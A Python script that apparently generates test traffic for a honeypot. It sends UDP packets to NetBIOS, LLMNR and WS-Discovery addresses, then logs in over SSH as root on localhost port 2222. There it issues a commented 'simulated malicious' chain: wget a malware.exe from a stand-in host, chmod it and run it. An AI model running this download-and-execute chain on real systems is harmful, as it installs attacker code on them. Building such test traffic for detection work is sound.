
import time
import paramiko
from paramiko import SSHException
import socket

def send_udp_packet(src_ip, dst_ip, src_port, dst_port, message):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # Only bind to the source IP if it's not 0.0.0.0, otherwise bind to the port only
        if src_ip != "0.0.0.0":
            sock.bind((src_ip, src_port))
        else:
            sock.bind(("", src_port))
        sock.sendto(message.encode(), (dst_ip, dst_port))
        sock.close()
        print(f"Sent packet from {src_ip}:{src_port} to {dst_ip}:{dst_port} with message '{message}'")
    except OSError as e:
        print(f"Error sending UDP packet: {e}")

def open_ssh_session(hostname='localhost', port=2222, username='root', password='r'):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(hostname, port, username, password)
        return ssh
    except Exception as e:
        print(f"Error connecting to SSH: {e}")
        return None

def execute_command(ssh, command):
    try:
        shell = ssh.invoke_shell()
        time.sleep(1)  # Wait for the shell to be ready

        shell.send(command + '\n')
        print(f"Executing: {command}")
        time.sleep(2)  # Add a delay to ensure the command is executed

        output = ""
        while not output.strip().endswith('#'):
            while shell.recv_ready():
                output += shell.recv(1024).decode()
                time.sleep(0.1)  # Wait for more data

        print(output)

        # Ensure all output is processed before closing
        time.sleep(2)

    except SSHException as e:
        print(f"SSH error: {e}")
    except Exception as e:
        print(f"Error executing command: {e}")

def close_ssh_session(ssh):
    try:
        ssh.close()
        print("SSH session closed.")
    except Exception as e:
        print(f"Error closing SSH session: {e}")

if __name__ == "__main__":
    hostname = 'localhost'
    port = 2222
    username = 'root'
    password = 't'

    udp_packets = [
        {"src_ip": "0.0.0.0", "dst_ip": "192.168.56.255", "src_port": 137, "dst_port": 137, "message": "packet1"},
        {"src_ip": "0.0.0.0", "dst_ip": "224.0.0.252", "src_port": 49743, "dst_port": 5355, "message": "packet2"},
        {"src_ip": "0.0.0.0", "dst_ip": "224.0.0.252", "src_port": 52608, "dst_port": 5355, "message": "packet3"},
        {"src_ip": "0.0.0.0", "dst_ip": "224.0.0.252", "src_port": 53607, "dst_port": 5355, "message": "packet4"},
        {"src_ip": "0.0.0.0", "dst_ip": "224.0.0.252", "src_port": 61992, "dst_port": 5355, "message": "packet5"},
        {"src_ip": "0.0.0.0", "dst_ip": "224.0.0.252", "src_port": 62412, "dst_port": 5355, "message": "packet6"},
        {"src_ip": "0.0.0.0", "dst_ip": "224.0.0.252", "src_port": 63685, "dst_port": 5355, "message": "packet7"},
        {"src_ip": "0.0.0.0", "dst_ip": "239.255.255.250", "src_port": 62980, "dst_port": 3702, "message": "packet8"},
    ]

    for packet in udp_packets:
        send_udp_packet(packet["src_ip"], packet["dst_ip"], packet["src_port"], packet["dst_port"], packet["message"])

    # Simulate malicious SSH commands
    commands = [
        'wget http://malicious.com/malware.exe -O /tmp/malware.exe',
        'chmod +x /tmp/malware.exe',
        '/tmp/malware.exe'
    ]
    for command in commands:
        ssh_session = open_ssh_session(hostname, port, username, password)
        if ssh_session:
            execute_command(ssh_session, command)
            close_ssh_session(ssh_session)
        else:
            print("Failed to establish SSH session.")
            break


